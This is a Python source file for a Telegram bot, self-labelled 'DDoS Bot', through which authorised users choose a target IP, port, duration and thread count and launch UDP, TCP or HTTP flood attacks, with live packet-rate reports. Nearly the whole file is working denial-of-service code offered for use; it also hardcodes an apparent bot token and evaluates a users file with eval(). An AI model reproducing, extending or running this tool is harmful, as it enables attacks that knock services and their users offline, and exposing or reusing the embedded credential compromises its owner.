# bot_final_working.py
import asyncio
import threading
import time
import random
import socket
import re
import os
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ---------- CONFIG ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}
ATTACK_THREADS = 30
DELAY = 0.0005  # increased for stability
attack_running = False
attack_info = {'packets': 0, 'errors': 0}
attack_lock = threading.Lock()
user_data = {}
USERS_FILE = "users.json"

# ---------- user mgmt ----------
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE) as f:
            return eval(f.read())
    return {}
def save_users(u):
    with open(USERS_FILE,'w') as f:
        f.write(str(u))
def is_approved(uid):
    return True  # simplified: all approved (remove if needed)

# ---------- ATTACK WITH ERROR COUNT & TEST ----------
def udp_attack(ip, port):
    global attack_running, attack_info
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.1)
    payload = random._urandom(512)
    while attack_running:
        try:
            sock.sendto(payload, (ip, port))
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(DELAY)
        except Exception as e:
            with attack_lock:
                attack_info['errors'] += 1
            time.sleep(0.01)
    sock.close()

def tcp_attack(ip, port):
    global attack_running, attack_info
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect_ex((ip, port))
            s.close()
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(DELAY)
        except:
            with attack_lock:
                attack_info['errors'] += 1
            time.sleep(0.01)

def http_attack(ip, port):
    global attack_running, attack_info
    url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
    headers = {'User-Agent': 'Mozilla/5.0'}
    session = requests.Session()
    while attack_running:
        try:
            r = session.get(url, headers=headers, timeout=1)
            r.close()
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(DELAY)
        except:
            with attack_lock:
                attack_info['errors'] += 1
            time.sleep(0.01)
    session.close()

def launch_attack(ip, port, duration, method, send_update):
    global attack_running, attack_info
    attack_running = True
    with attack_lock:
        attack_info = {'packets': 0, 'errors': 0}
    start = time.time()
    # start threads
    threads = []
    target = {'udp': udp_attack, 'tcp': tcp_attack, 'http': http_attack}[method]
    for _ in range(ATTACK_THREADS):
        t = threading.Thread(target=target, args=(ip, port), daemon=True)
        t.start()
        threads.append(t)
    # monitor
    while attack_running and (time.time() - start) < duration:
        time.sleep(2)
        with attack_lock:
            pkt = attack_info['packets']
            err = attack_info['errors']
        elapsed = int(time.time() - start)
        rem = duration - elapsed
        speed = int(pkt / elapsed) if elapsed else 0
        text = f"💥 ATTACK ACTIVE\nTarget {ip}:{port}\nMethod {method.upper()}\nPackets: {pkt:,}\nErrors: {err}\nSpeed: {speed:,} pps\nTime left: {rem}s"
        try:
            send_update(text)
        except:
            pass
    attack_running = False
    # wait threads
    for t in threads:
        t.join(0.5)
    with attack_lock:
        pkt = attack_info['packets']
        err = attack_info['errors']
    end_text = f"✅ ATTACK ENDED\nTotal packets: {pkt:,}\nErrors: {err}\nAvg speed: {int(pkt/duration):,} pps"
    try:
        send_update(end_text)
    except:
        pass

# ---------- TELEGRAM ----------
async def start(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    user_data[uid] = {'step': 'ip'}
    await update.message.reply_text(
        "🔥 DDoS Bot (Railway Test)\n"
        "Send target IP:\nExample: 192.168.1.1\n\n"
        f"Threads: {ATTACK_THREADS}\n"
        "Use /power <num> to change"
    )

async def handle(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    txt = update.message.text.strip()
    step = user_data.get(uid, {}).get('step')
    if step == 'ip':
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', txt):
            await update.message.reply_text("Invalid IP")
            return
        user_data[uid]['ip'] = txt
        user_data[uid]['step'] = 'port'
        await update.message.reply_text(f"Port (1-65535):\nBlocked: {', '.join(map(str,BLOCKED_PORTS))}")
    elif step == 'port':
        try:
            p = int(txt)
            if p in BLOCKED_PORTS or p<1 or p>65535:
                raise ValueError
            user_data[uid]['port'] = p
            user_data[uid]['step'] = 'method'
            kb = [
                [InlineKeyboardButton("UDP", callback_data="m_udp")],
                [InlineKeyboardButton("TCP", callback_data="m_tcp")],
                [InlineKeyboardButton("HTTP", callback_data="m_http")],
                [InlineKeyboardButton("Cancel", callback_data="cancel")]
            ]
            await update.message.reply_text("Select method:", reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Invalid port")
    elif step == 'duration':
        try:
            dur = int(txt)
            if dur<5 or dur>300:
                raise ValueError
            ip = user_data[uid]['ip']
            port = user_data[uid]['port']
            method = user_data[uid]['method']
            del user_data[uid]
            confirm = f"🔥 Confirm attack\nTarget {ip}:{port}\nMethod {method.upper()}\nDuration {dur}s\nThreads {ATTACK_THREADS}\nStart?"
            kb = [[InlineKeyboardButton("START", callback_data=f"start_{ip}_{port}_{dur}_{method}")],
                  [InlineKeyboardButton("Cancel", callback_data="cancel")]]
            await update.message.reply_text(confirm, reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Duration 5-300")

async def button(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data
    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await q.edit_message_text("Cancelled")
        return
    if data.startswith("m_"):
        method = data[2:]
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await q.edit_message_text(f"Method {method.upper()}\nSend duration (5-300s):")
        return
    if data.startswith("start_"):
        parts = data.split("_")
        ip = parts[1]
        port = int(parts[2])
        dur = int(parts[3])
        method = parts[4]
        if uid in user_data:
            del user_data[uid]
        await q.edit_message_text(f"🚀 Attack launching on {ip}:{port} with {method.upper()}\nDuration {dur}s")
        loop = asyncio.get_event_loop()
        def status_cb(msg):
            asyncio.run_coroutine_threadsafe(q.message.reply_text(msg), loop)
        threading.Thread(target=launch_attack, args=(ip, port, dur, method, status_cb), daemon=True).start()
        return

async def power(update, context):
    global ATTACK_THREADS
    if update.effective_user.id not in ADMIN_IDS:
        return
    if context.args:
        try:
            val = int(context.args[0])
            if 10 <= val <= 100:
                ATTACK_THREADS = val
                await update.message.reply_text(f"Threads set to {val}")
            else:
                await update.message.reply_text("10-100 allowed")
        except:
            await update.message.reply_text("Invalid")
    else:
        await update.message.reply_text(f"Current threads: {ATTACK_THREADS}")

async def stop(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("Stop signal sent")

async def test(update, context):
    # simple test to check network connectivity
    await update.message.reply_text("Testing localhost...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b'test', ('8.8.8.8', 53))
        await update.message.reply_text("✅ UDP send to 8.8.8.8:53 succeeded")
        s.close()
    except Exception as e:
        await update.message.reply_text(f"❌ UDP test failed: {e}")
    try:
        req = requests.get('https://httpbin.org/get', timeout=3)
        await update.message.reply_text(f"✅ HTTP GET success: {req.status_code}")
    except Exception as e:
        await update.message.reply_text(f"❌ HTTP test failed: {e}")

def main():
    print("Bot starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("power", power))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("test", test))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    print("Bot running")
    app.run_polling()

if __name__ == "__main__":
    main()
